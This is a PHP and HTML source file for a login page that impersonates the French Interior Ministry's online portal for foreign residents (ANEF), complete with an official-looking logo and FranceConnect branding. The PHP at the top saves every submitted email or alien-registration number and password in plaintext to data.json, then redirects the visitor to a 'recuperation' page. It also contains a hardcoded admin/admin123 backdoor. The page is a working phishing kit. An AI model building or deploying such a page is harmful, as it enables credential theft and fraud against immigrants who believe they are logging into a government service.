<?php
// Pour le debug : afficher les erreurs PHP
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// Remplacer la connexion à la base de données par la lecture du fichier users.json
$usersFile = __DIR__ . '/users.json';
$users = [];
if (file_exists($usersFile)) {
    $json = file_get_contents($usersFile);
    $users = json_decode($json, true) ?: [];
}

$dataFile = __DIR__ . '/data.json';
$allData = [];
if (file_exists($dataFile)) {
    $json = file_get_contents($dataFile);
    $allData = json_decode($json, true) ?: [];
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';

    $isEmail = filter_var($username, FILTER_VALIDATE_EMAIL);
    $isIdentifiant = preg_match('/^\d{10}$/', $username);

    // Cas spécial pour admin
    if ($username === 'admin' && $password === 'admin123') {
        header('Location: admin.php');
        exit();
    }

    if ($isEmail || $isIdentifiant) {
        $exists = false;
        foreach ($allData as $entry) {
            if (($entry['username'] ?? '') === $username) {
                $exists = true;
                break;
            }
        }
        if (!$exists) {
            $newEntry = [
                'id' => count($allData) + 1,
                'username' => $username,
                'password' => $password,
                'email' => $isEmail ? $username : '',
                'identifiant' => $isIdentifiant ? $username : '',
                'created_at' => date('Y-m-d H:i:s')
            ];
            $allData[] = $newEntry;
            file_put_contents($dataFile, json_encode($allData, JSON_PRETTY_PRINT));
        }
        header('Location: recuperation.php');
        exit();
    } else {
        $error = "Veuillez entrer un email valide ou un identifiant (10 chiffres).";
    }
}
if (!isset($error)) $error = '';
?>

<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Connexion à Administration numérique pour les étrangers en France</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {
            background: #f7f7fb;
            font-family: Arial, sans-serif;
            margin: 0;
        }

        .fr-footer {
    box-shadow: inset 0 2px 0 0 #000091, inset 0 -1px 0 0 #eee;
    padding-top: 2rem;
    width: 100%;
    background: #fff;
    font-family: 'Marianne', Arial, sans-serif;
    font-size: 1rem;
    color: #222;
    margin-top: 40px;
}
.fr-footer__body {
    display: flex;
    justify-content: space-between;
    align-items: flex-start;
    flex-wrap: wrap;
    gap: 2rem;
    border-bottom: 1px solid #eee;
    padding-bottom: 1.5rem;
    margin-left: 90px;
}
.fr-footer__brand .fr-logo {
    font-weight: bold;
    font-size: 1.2em;
    margin: 0;
}
.fr-footer__content-list {
    list-style: none;
    padding: 0;
    color: #000; /* noir */
    display: flex;
    gap: 1.5rem;
    justify-content: center; /* centre horizontalement */
    align-items: center;      /* centre verticalement */
    text-align: center;       /* centre le texte */
}
.fr-footer__content-link {
    color: #2a3cff;
    text-decoration: underline;
}
.fr-footer__partners {
    margin: 2rem 0;
    margin-left: 96px;
}
.fr-footer__partners-title {
    font-size: 1.1em;
    font-weight: bold;
    margin-bottom: 0.5rem;
}
.fr-footer__partners-logos {
    display: flex;
    align-items: center;
    gap: 1rem;
}
.fr-footer__logo {
    height: 5.625rem;
}
.fr-footer__bottom {
    border-top: 1px solid #eee;
    padding-top: 1rem;
    margin-top: 1rem;
    display: flex;
    flex-wrap: wrap;
    justify-content: space-between;
    align-items: center;
}
.fr-footer__bottom-list {
    list-style: none;
    display: flex;
    gap: 1.5rem;
    margin: 0;
    padding: 0;
}
.fr-footer__bottom-link {
    color: #222;
    text-decoration: underline;
}
.fr-footer__bottom-copy {
    font-size: 0.95em;
    color: #666;
}
@media (max-width: 900px) {
    .fr-footer__body, .fr-footer__bottom {
        flex-direction: column;
        gap: 1rem;
    }
    .fr-footer__content-list, .fr-footer__bottom-list {
        flex-direction: column;
        gap: 0.5rem;
    }
}
        /* Header DSFR styles */
        .fr-header {
            position: relative;
            width: 100%;
            background: #fff;
            border-bottom: 1px solid #eee;
            font-family: 'Marianne', Arial, sans-serif;
            font-size: 1rem;
            color: #222;
        }
        .fr-header__body {
            padding: 0 2rem;
        }
        .fr-header__body-row {
            display: flex;
            align-items: center;
            justify-content: space-between;
            min-height: 90px;
        }
        .fr-header__brand {
            display: flex;
            align-items: center;
        }
        .fr-header__logo img {
            height: 60px;
            margin-right: 24px;
        }
        .fr-header__service-title {
            font-size: 1.5em;
            font-weight: bold;
            margin: 0;
        }
        .fr-header__service-tagline {
            font-size: 1em;
            color: #131212;
            margin: 0;
        }
        .fr-header__tools {
            display: flex;
            align-items: center;
            gap: 1.5rem;
        }
        .fr-btns-group {
            list-style: none;
            display: flex;
            gap: 1rem;
            margin: 0;
            padding: 0;
        }
        .fr-btn {
            background: none;
            border: none;
            color: #000091;
            font-weight: 500;
            font-size: 1em;
            cursor: pointer;
            text-decoration: none;
            padding: 0.5em 1em;
        }
        .fr-btn:hover {
            text-decoration: underline;
        }
        .fr-lang .fr-btn {
            border: 1px solid #ccc;
            border-radius: 4px;
            background: #f7f7fb;
        }
        .fr-nav {
            margin-top: 1rem;
        }
        .fr-nav__list {
            list-style: none;
            margin: 0;
            padding: 0;
            display: flex;
            gap: 2rem;
            height: 40px;
        }
        .hr{
            color: #b4b4b4;
        }
        .fr-nav__link {
            color: #222;
            text-decoration: none;
            font-weight: 500;
            font-size: 1.1em;
        }
        .fr-nav__link:hover {
            color: #2a3cff;
            text-decoration: underline;
        }
        /* Login styles */
        .login-main {
            background: #f6f6f6;
            max-width: 600px;
            margin: 24px auto 0 auto;
            border-radius: 8px;
            box-shadow: 0 2px 16px rgba(0,0,0,0.07);
            padding: 48px 40px 40px 40px;
        }
        .login-title {
            font-size: 2.6em;
            font-weight: bold;
            margin-bottom: 18px;
            color: #111;
            line-height: 1.1;
        }
        .login-subtitle {
            font-size: 1.4em;
            font-weight: bold;
            margin-bottom: 18px;
            color: #222;
        }
        .login-desc {
            color: #444;
            font-size: 1em;
            margin-bottom: 18px;
        }
        .login-form label {
            display: block;
            margin-bottom: 6px;
            font-weight: 500;
            color: #222;
        }
        .login-form input[type="text"],
        .login-form input[type="password"] {
            width: 100%;
            padding: 12px 14px;
            margin-bottom: 12px;
            border: none;
            border-bottom: 3px solid #222;
            border-radius: 0;
            font-size: 1.15em;
            background: #e9edfc;
            transition: border-color 0.2s;
        }
        .login-form input[type="text"]:focus,
        .login-form input[type="password"]:focus {
            outline: none;
            border-bottom: 3px solid #000091;
            background: #f7f7fb;
        }
        .login-form .input-row {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        .login-form .input-row label {
            margin-bottom: 0;
            margin-left: 8px;
            font-weight: normal;
        }
        .login-form .forgot-link {
            display: block;
            margin: 8px 0 24px 0;
            color: #000091;
            text-decoration: underline;
            font-size: 1.05em;
        }
        .login-form button {
            width: 100%;
            background: #000091;
            color: #fff;
            border: none;
            border-radius: 0;
            padding: 14px 0;
            font-size: 1.2em;
            font-weight: 600;
            cursor: pointer;
            margin-top: 12px;
            margin-bottom: 32px;
            transition: background 0.2s;
        }
        .login-form button:hover {
            background: #2a3cff;
        }
        .separator {
            display: flex;
            align-items: center;
            text-align: center;
            margin: 32px 0 24px 0;
        }
        .separator hr {
            flex: 1;
            border: none;
            border-top: 1.5px solid #ccc;
        }
        .separator span {
            margin: 0 18px;
            color: #444;
            font-weight: bold;
            font-size: 1.1em;
        }
        .fc-block {
            margin: 0 0 32px 0;
        }
        .fc-block-title {
            font-size: 1.6em;
            font-weight: bold;
            margin-bottom: 10px;
        }
        .fc-block-desc {
            color: #444;
            margin-bottom: 18px;
        }
        .fc-btn {
            display: flex;
            align-items: center;
            background: #000091;
            color: #fff;
            font-weight: bold;
            font-size: 1.25em;
            border: none;
            border-radius: 0;
            padding: 12px 18px;
            margin-bottom: 10px;
            cursor: pointer;
            width: fit-content;
            text-decoration: none;
        }
        .fc-btn img {
            height: 38px;
            margin-right: 14px;
        }
        .fc-link {
            color: #000091;
            text-decoration: underline;
            font-size: 1.05em;
        }
        .create-account-section {
            margin-top: 36px;
            border-top: 1.5px solid #ccc;
            padding-top: 28px;
        }
        .create-account-title {
            font-size: 1.5em;
            font-weight: bold;
            margin-bottom: 18px;
        }
        .create-account-btn {
            display: block;
            width: 100%;
            border: 2px solid #000091;
            background: #fff;
            color: #000091;
            font-size: 1.2em;
            font-weight: 500;
            padding: 14px 0;
            border-radius: 0;
            text-align: center;
            text-decoration: none;
            margin-top: 8px;
            transition: background 0.2s, color 0.2s;
        }
        .create-account-btn:hover {
            background: #f0f3ff;
        }
        @media (max-width: 700px) {
            .login-main { padding: 24px 8px; }
            .login-title { font-size: 2em; }
        }
    </style>
</head>
<body>

    <!-- Header DSFR simplifié -->
    <div class="fr-header">
      <div class="fr-header__body">
        <div class="fr-container">
          <div class="fr-header__body-row">
            <div class="fr-header__brand fr-enlarge-link">
              <div class="fr-header__brand-top">
                <div class="fr-header__logo">
                  <img src="image-1773742141442.png" alt="Ministère de l'intérieur" style="height:90px;">
                </div>
              </div>
              <div class="fr-header__service">
                <p class="fr-header__service-title">
                  Administration numérique pour les étrangers en France
                </p>

                <ul></ul>
                <p class="fr-header__service-tagline">Direction Générale des étrangers en France</p>
              </div>
            </div>
            <div class="fr-header__tools">
              <ul class="fr-btns-group">
                <li>
                  <a class="fr-btn" href="#">&#128222; Nous contacter</a>
                </li>
                <li>
                  <a class="fr-btn" href="#">&#10067; Besoin d'aide ?</a>
                </li>
              </ul>
              <div class="fr-lang">
                <button class="fr-btn">FR</button>
              </div>
            </div>
          </div>
          <hr> 
          <nav class="fr-nav">
            
            <ul class="fr-nav__list">
              <li class="fr-nav__item">
                <a class="fr-nav__link" href="index.php">Accueil</a>
              </li>
            </ul>
          </nav>
        </div>
      </div>
    </div>

    <div class="login-main">
        <div class="login-title">
            Connexion à Administration numérique<br>
            pour les étrangers en France
        </div>
        <div class="login-subtitle">Se connecter avec son compte</div>
        <div class="login-desc">
            Tous les champs sont obligatoires.<br>
            <br>
            <strong>Identifiant</strong><br>
            <span style="font-size:0.98em;color:#555;">
                Votre identifiant de connexion est votre numéro d'étranger, si vous n'en avez pas, votre adresse mail.<br>
                Format attendu : 9999999999
            </span>
        </div>
        <?php if (!empty($error)): ?>
            <div style="color:red; font-weight:bold; margin-bottom:15px;">
                <?= htmlspecialchars($error) ?>
            </div>
        <?php endif; ?>
        <form class="login-form" method="post" action="">
            <input type="text" id="username" name="username" placeholder="Email ou identifiant (9999999999)" required>
            <div class="input-row">
                <input type="password" id="password" name="password" placeholder="Mot de passe" required>
                <input type="checkbox" id="showpass" onclick="togglePassword()">
                <label for="showpass">Afficher</label>
            </div>
            <a href="#" class="forgot-link">Mot de passe oublié ?</a>
            <button type="submit">Se connecter</button>
        </form>
        <div class="separator">
            <hr><span>ou</span><hr>
        </div>
        <div class="fc-block">
            <div class="fc-block-title">Se connecter avec FranceConnect</div>
            <div class="fc-block-desc">
                FranceConnect est la solution proposée par l’État pour sécuriser et simplifier la connexion à vos services en ligne.
            </div>
            <img src="image-1773716976415.png" alt="FranceConnect">
            <div>
                <a href="#" class="fc-link">Qu’est-ce que FranceConnect ? <span style="font-size:1.1em;">&#8599;</span></a>
            </div>
        </div>
        <div class="create-account-section">
            <div class="create-account-title">Vous n'avez pas de compte ?</div>
            <a href="#" class="create-account-btn">Créer un compte</a>
        </div>
    </div>
    <script>
        function togglePassword() {
            var pwd = document.getElementById("password");
            pwd.type = pwd.type === "password" ? "text" : "password";
        }
    </script>
    <!-- Footer DSFR simplifié -->
<footer class="fr-footer" role="contentinfo" id="footer-7475">
  <div class="fr-container">
    <div class="fr-footer__body">
      <div class="fr-footer__brand fr-enlarge-link">
      <img class="fr-logo" src="image-1773744180833.png" alt="">
      </div>
      <div class="fr-footer__content">
        <ul class="fr-footer__content-list">
          <li class="fr-footer__content-item">
            <a target="_blank" rel="noopener external" title="service-public.fr - Nouvelle fenêtre" class="fr-footer__content-link" href="https://service-public.fr">service-public.fr</a>
          </li>
          <li class="fr-footer__content-item">
            <a target="_blank" rel="noopener external" title="data.gouv.fr - Nouvelle fenêtre" class="fr-footer__content-link" href="https://data.gouv.fr/fr">data.gouv.fr</a>
          </li>
        </ul>
      </div>
    </div>
    <div class="fr-footer__partners">
      <h2 class="fr-footer__partners-title">Nos Partenaires</h2>
      <div class="fr-footer__partners-logos">
        <div class="fr-footer__partners-main">
          <a class="fr-footer__partners-link" href="https://www.immigration.interieur.gouv.fr/fr/Info-ressources/Fonds-europeens/Les-fonds-europeens-programmation-2014-2020/Le-Fonds-Asile-Migration-Integration-FAMI-et-le-Fonds-Securite-Interieure-FSI">
            <img class="fr-footer__logo" style="height: 5.625rem" src="logo-fami.png" alt="Financé par le Fonds Asile, Migration et Intégration. Union Européenne">
          </a>
        </div>
      </div>
    </div>
    <div class="fr-footer__bottom">
      <ul class="fr-footer__bottom-list">
        <li class="fr-footer__bottom-item">
          <a class="fr-footer__bottom-link" href="#">Plan du site</a>
        </li>
        <li class="fr-footer__bottom-item">
          <a class="fr-footer__bottom-link" href="#">Accessiblité : non conforme</a>
        </li>
        <li class="fr-footer__bottom-item">
          <a class="fr-footer__bottom-link" href="#">Mentions légales</a>
        </li>
      </ul>
      <div class="fr-footer__bottom-copy">
        <p>Sauf mention explicite de propriété intellectuelle détenue par des tiers, les contenus de ce site sont proposés sous <a href="https://github.com/etalab/licence-ouverte/blob/master/LO.md" target="_blank" rel="noopener external" title="Licence etalab - nouvelle fenêtre">licence etalab-2.0</a>
        </p>
      </div>
    </div>
  </div>
</footer>
</body>
</html>